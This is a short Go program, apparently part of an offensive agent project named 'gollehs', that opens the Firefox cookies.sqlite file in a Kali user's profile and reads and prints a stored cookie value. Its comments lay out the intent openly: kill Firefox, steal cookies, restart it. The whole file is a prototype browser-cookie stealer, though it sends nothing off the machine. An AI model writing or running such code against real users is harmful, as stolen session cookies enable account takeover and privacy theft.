package main

import (
	"database/sql"
	"fmt"

	_ "github.com/mattn/go-sqlite3"
	"github.com/s-christian/gollehs/lib/logger"
)

type Agent struct {
	Session string
}

var db *sql.DB

func main() {
	var err error
	// os.Remove("./data/sqlite-database.db")
	//kill firefox
	//steal cookies
	//start it again
	db, err = sql.Open("sqlite3", "/home/kali/.mozilla/firefox/e1v7nj1v.default-esr/cookies.sqlite")
	if err != nil {
		println(err)
	}
	db.Ping()

	FetchSQL := `
	SELECT 
	value from moz_cookies LIMIT 1
	
	`
	agentStruct := Agent{}
	row := db.QueryRow(FetchSQL)

	err = row.Scan(
		&agentStruct.Session,
	)
	switch err {
	case sql.ErrNoRows:
		logger.Logf(logger.Info, "No rows were returned! \n")
	case nil:
		fmt.Println(agentStruct)
	default:
		panic(err)
	}
	fmt.Println(agentStruct)

}
